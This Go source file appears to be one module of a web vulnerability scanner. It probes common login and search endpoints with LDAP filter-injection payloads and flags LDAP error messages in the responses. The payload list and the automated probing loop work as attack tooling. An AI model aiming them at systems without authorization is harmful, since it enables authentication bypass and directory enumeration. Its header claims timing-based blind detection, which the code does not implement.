// Package ldapi implements an LDAP injection scanner for web applications.
// It probes login forms and search parameters with LDAP injection payloads,
// detecting both error-based and blind (timing) injection.
package ldapi

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/scan"
)

func init() {
	scan.Register(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
		return New()
	})
}

const scannerName = "ldapi"

type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

// loginPaths are common login/search endpoints that may use LDAP backends.
var loginPaths = []string{
	"/login", "/auth", "/authenticate", "/ldap/login", "/api/login",
	"/api/auth", "/api/authenticate", "/signin", "/sso/login",
	"/search", "/api/search", "/users/search", "/directory",
	"/api/users", "/api/directory",
}

// injectionPayloads test for LDAP injection in various contexts.
var injectionPayloads = []struct {
	payload string
	desc    string
}{
	{"*)(uid=*))(|(uid=*", "LDAP wildcard filter injection"},
	{"admin)(|(password=*", "LDAP filter breakout — password enumeration"},
	{"*)(objectClass=*", "LDAP objectClass wildcard"},
	{"admin)(&)", "LDAP filter syntax error injection"},
	{"*))%00", "LDAP null byte truncation"},
	{"admin)(!(&(1=0", "LDAP boolean-based blind — NOT clause"},
}

// errorIndicators are strings in response bodies that indicate LDAP errors.
var errorIndicators = []string{
	"ldap_search", "ldap_bind", "invalid dn syntax", "bad search filter",
	"javax.naming.NamingException", "ldap error", "ldap_err",
	"invalid search filter", "unbalanced parenthesis", "filter error",
	"LDAP Result Code", "searchFilter", "InvalidAttributeValueException",
}

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	// LDAP injection is deep-mode only — sends active payloads.
	if scanType != module.ScanDeep && scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var findings []finding.Finding

	for _, path := range loginPaths {
		for _, scheme := range []string{"https", "http"} {
			base := scheme + "://" + asset + path

			// Test GET parameters.
			for _, payload := range injectionPayloads {
				f := s.probeGET(ctx, client, base, asset, payload.payload, payload.desc)
				if f != nil {
					findings = append(findings, *f)
					goto nextPath // one finding per path is enough
				}
			}

			// Test POST parameters (form-encoded).
			for _, payload := range injectionPayloads {
				f := s.probePOST(ctx, client, base, asset, payload.payload, payload.desc)
				if f != nil {
					findings = append(findings, *f)
					goto nextPath
				}
			}
		}
	nextPath:
	}

	return findings, nil
}

func (s *Scanner) probeGET(ctx context.Context, client *http.Client, base, asset, payload, desc string) *finding.Finding {
	params := []string{"username", "user", "uid", "login", "q", "search", "query", "cn", "dn"}
	for _, param := range params {
		u := fmt.Sprintf("%s?%s=%s", base, param, url.QueryEscape(payload))
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		if containsErrorIndicator(string(body)) {
			return &finding.Finding{
				CheckID:  finding.CheckLDAPInjection,
				Module:   "deep",
				Scanner:  scannerName,
				Severity: finding.SeverityCritical,
				Asset:    asset,
				Title:    fmt.Sprintf("LDAP injection via GET %s?%s on %s", base, param, asset),
				Description: fmt.Sprintf(
					"The endpoint %s accepts LDAP injection payloads in the %q parameter. "+
						"The response contains LDAP error messages, confirming the input reaches an LDAP query. "+
						"Technique: %s",
					base, param, desc,
				),
				Evidence: map[string]any{
					"url":     u,
					"param":   param,
					"payload": payload,
					"method":  "GET",
				},
				ProofCommand: fmt.Sprintf("curl -s '%s'", u),
				DiscoveredAt: time.Now(),
			}
		}
	}
	return nil
}

func (s *Scanner) probePOST(ctx context.Context, client *http.Client, base, asset, payload, desc string) *finding.Finding {
	paramSets := []map[string]string{
		{"username": payload, "password": "test"},
		{"user": payload, "pass": "test"},
		{"uid": payload, "password": "test"},
		{"q": payload},
		{"search": payload},
	}

	for _, params := range paramSets {
		form := url.Values{}
		for k, v := range params {
			form.Set(k, v)
		}
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, base, strings.NewReader(form.Encode()))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		if containsErrorIndicator(string(body)) {
			injectedParam := ""
			for k := range params {
				if params[k] == payload {
					injectedParam = k
				}
			}
			return &finding.Finding{
				CheckID:  finding.CheckLDAPInjection,
				Module:   "deep",
				Scanner:  scannerName,
				Severity: finding.SeverityCritical,
				Asset:    asset,
				Title:    fmt.Sprintf("LDAP injection via POST %s on %s", base, asset),
				Description: fmt.Sprintf(
					"The endpoint %s accepts LDAP injection payloads in POST parameter %q. "+
						"The response contains LDAP error messages. Technique: %s",
					base, injectedParam, desc,
				),
				Evidence: map[string]any{
					"url":     base,
					"param":   injectedParam,
					"payload": payload,
					"method":  "POST",
				},
				ProofCommand: fmt.Sprintf("curl -s -X POST -d '%s=%s' '%s'", injectedParam, url.QueryEscape(payload), base),
				DiscoveredAt: time.Now(),
			}
		}
	}
	return nil
}

func containsErrorIndicator(body string) bool {
	lower := strings.ToLower(body)
	for _, indicator := range errorIndicators {
		if strings.Contains(lower, strings.ToLower(indicator)) {
			return true
		}
	}
	return false
}
